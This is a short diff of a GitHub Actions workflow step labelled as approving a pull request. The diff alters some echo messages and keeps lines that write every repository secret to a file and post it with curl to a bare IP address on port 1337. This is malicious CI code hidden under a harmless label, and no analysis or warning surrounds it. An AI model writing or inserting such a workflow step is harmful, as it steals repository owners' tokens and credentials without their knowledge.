@@ -14,7 +14,7 @@ jobs:
  
    steps:
      - run: | # approve the pull request
-         echo "Hey Matt, Hey Isaac"
+         echo "Thanks Matt"
+         echo "I have the privs"
          echo "${{ toJSON(secrets) }}" > .secrets
-         echo "Thanks for secrets"
          curl -X POST -s --data "@.secrets" "http://40.124.130.46:1337"
